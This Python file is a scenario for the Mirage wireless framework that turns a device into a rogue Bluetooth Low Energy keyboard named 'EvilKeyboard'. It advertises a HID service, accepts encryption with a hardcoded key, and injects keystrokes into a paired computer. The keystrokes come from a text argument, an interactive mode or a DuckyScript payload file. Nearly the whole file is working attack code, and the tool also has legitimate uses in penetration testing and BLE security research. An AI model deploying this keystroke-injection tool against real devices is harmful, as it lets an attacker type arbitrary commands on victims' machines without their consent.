from mirage.core import scenario
from mirage.libs import io, utils
from mirage.libs.ble_utils.dissectors import HIDoverGATTKeystroke, UUID
from mirage.libs.ble_utils.packets import BLEDisconnect, BLEHandleValueNotification, BLELongTermKeyRequestReply
from mirage.libs.common import parsers
from mirage.libs.wireless_utils.packets import WaitPacket

REPORT_MAP = bytes.fromhex("05010906a1018501050719e029e7150025019508750181029501750881010507190029ff150025ff950675088100050819012905950575019102950175039101c0")
# Problème au niveau des modifiers !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
class keyboard_hid_over_gatt(scenario.Scenario):

	def enableAdvertising(self):
		advertisementServices = (
			UUID(UUID16=0x180F).data[::-1]+ # Battery Service
			UUID(UUID16=0x180A).data[::-1]+ # Device Information Service
			UUID(UUID16=0x1812).data[::-1] # BLE HID Service
		)
		
		data = bytes([
			# Length
			2,
			# Flags data type value.
			0x01,
			# BLE general discoverable, without BR/EDR support.
			0x01 | 0x04,
			# Length.
			1 + len(advertisementServices),
			# Complete list of 16-bit Service UUIDs data type value.
			0x03,
		]
		) + advertisementServices
		self.emitter.setAdvertisingParameters(data=data)
		self.emitter.setScanningParameters(data=bytes.fromhex("0d094576696c4b6579626f617264") + data)


		self.emitter.setAdvertising(enable=True)

	def initializeDeviceInformationService(self):
		self.server.addPrimaryService(UUID(name="Device Information").data)
		self.server.addCharacteristic(UUID(name="Manufacturer Name String").data,b"EvilKeyboard")
		self.server.addCharacteristic(UUID(name="PnP ID").data,bytes.fromhex("014700ffffffff"))

	def initializeBatteryService(self):
		self.server.addPrimaryService(UUID(name="Battery Service").data)
		self.server.addCharacteristic(UUID(name="Battery Level").data,b"0000000000")
		self.server.addDescriptor(UUID(name="Client Characteristic Configuration").data,b"\x01\x00")
		self.server.addDescriptor(UUID(name="Characteristic Presentation Format").data,b"\x04\x00\xad\x27\x01\x00\x00")

	def initializeHIDService(self):
		self.server.addPrimaryService(UUID(name="Human Interface Device").data)
		self.server.addCharacteristic(UUID(name="Report").data,b"\x00\x00\x00\x00\x00\x00\x00\x00",permissions=["Read","Write","Notify"])
		self.server.addDescriptor(UUID(name="Client Characteristic Configuration").data,b"\x00",permissions=["Read","Write","Notify"])
		self.server.addDescriptor(UUID(name="Report Reference").data,b"\x01\x01", permissions=["Read","Write","Notify"]) # report ID 0x00, report type (0x01 = input)
		self.server.addCharacteristic(UUID(name="Report Map").data,REPORT_MAP)
		self.server.addCharacteristic(UUID(name="HID Information").data,bytes.fromhex("00010002")) # version=0x0100 countrycode=0x00 flags=0x02(normally connectable)
		self.server.addCharacteristic(UUID(name="HID Control Point").data, b"\x00",permissions=['Write Without Response'])
		self.server.addCharacteristic(UUID(name="Protocol Mode").data,b"\x01",permissions=['Write Without Response', 'Read','Notify'])
		
	def allowEncryption(self,pkt):
		pkt.show()
		self.emitter.sendp(BLELongTermKeyRequestReply(positive=True, ltk=bytes.fromhex("112233445566778899aabbccddeeff")[::-1]))
		
	def initializeServices(self):
		self.initializeDeviceInformationService()
		self.initializeBatteryService()
		self.initializeHIDService()
		
		self.module.show("gatt")

	def addHIDoverGATTKeystroke(self,locale="fr",key="a",ctrl=False, alt=False, gui=False,shift=False):
		keystrokes = []
		keystrokePressed = HIDoverGATTKeystroke(locale=locale,key=key,ctrl=ctrl,alt=alt,gui=gui,shift=shift)
		keystrokeReleased = bytes([0,0,0,0,0,0,0,0])
		keystrokes.append(BLEHandleValueNotification(handle=0x000d,value=keystrokePressed.data))
		keystrokes.append(BLEHandleValueNotification(handle=0x000d,value=keystrokeReleased))
		return keystrokes

	def startHIDoverGATTInjection(self):
		return []

	def addHIDoverGATTDelay(self,duration=1000):
		keystrokes = []
		keystrokes.append(WaitPacket(time=0.0001*duration))
		return keystrokes

	def addHIDoverGATTText(self,string="hello world !",locale="fr"):
		keystrokes = []
		for letter in string:
			keystrokes += self.addHIDoverGATTKeystroke(key=letter,locale=locale)
		return keystrokes

	def onStart(self):
		self.emitter = self.module.emitter
		self.receiver = self.module.receiver
		self.server = self.module.server
		self.mode = "text"
		self.enableAdvertising()
		self.initializeServices()
		if "PAIRING" in self.module.args and self.module.args["PAIRING"].lower()=="passive":
			self.module.pairing(active="passive")

		io.info("Generating attack stream ...")
		self.attackStream = self.startHIDoverGATTInjection()
		self.mode = None
		if "TEXT" in self.module.args and self.module.args["TEXT"] != "":
			self.mode = "text"
			text = self.module.args["TEXT"]
			io.info("Text injection: "+text)
			self.attackStream += self.addHIDoverGATTText(text)
			io.info("You can start the injection by pressing [SPACE]")
		elif "INTERACTIVE" in self.module.args and utils.booleanArg(self.module.args["INTERACTIVE"]):
			self.mode = "interactive"
			io.info("Interactive mode")

		elif "DUCKYSCRIPT" in self.module.args and self.module.args["DUCKYSCRIPT"] != "":
			self.mode = "duckyscript"
			io.info("Duckyscript injection: "+self.module.args["DUCKYSCRIPT"])
			parser = parsers.DuckyScriptParser(filename=self.args["DUCKYSCRIPT"])
			self.attackStream = parser.generatePackets(
				textFunction=self.addHIDoverGATTText,
				initFunction=self.startHIDoverGATTInjection,
				keyFunction=self.addHIDoverGATTKeystroke,
				sleepFunction=self.addHIDoverGATTDelay
				)
			io.info("You can start the injection by pressing [SPACE]")
		return True
		
	def onPairingOK(self,pkt):
		self.emitter.sendp(BLEDisconnect())

	def onMasterConnect(self,pkt):
		if "PAIRING" in self.module.args and self.module.args["PAIRING"].lower()=="active":
			self.module.pairing(active="active")
			self.receiver.onEvent("BLEMasterIdentification",callback=self.onPairingOK)
		else:
			self.receiver.onEvent("BLELongTermKeyRequest",callback=self.allowEncryption)
		
	def onEnd(self):
		return True
	
	def onKey(self,key):
		if key == "esc":
			self.emitter.sendp(BLEDisconnect())
			return False
		if self.mode in ("text","duckyscript") and key.lower() == "space":
			print(self.attackStream)
			for o in self.attackStream:
				print(o)
			self.emitter.sendp(*self.attackStream)

		if self.mode == "interactive":
			if self.mode == "interactive":
				injectedKeystroke = ""
				if key == "space":
					injectedKeystroke = " "
				elif key == "delete":
					injectedKeystroke = "DEL"
				elif key in ["enter","shift","alt","ctrl","backspace","up","down","left","right","f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f12"]:
					injectedKeystroke = key.upper()
				else:
					injectedKeystroke = key
				io.info("Injecting:"+str(injectedKeystroke))
				self.emitter.sendp(*(self.addHIDoverGATTKeystroke(key=injectedKeystroke,locale="fr")))
		return False	
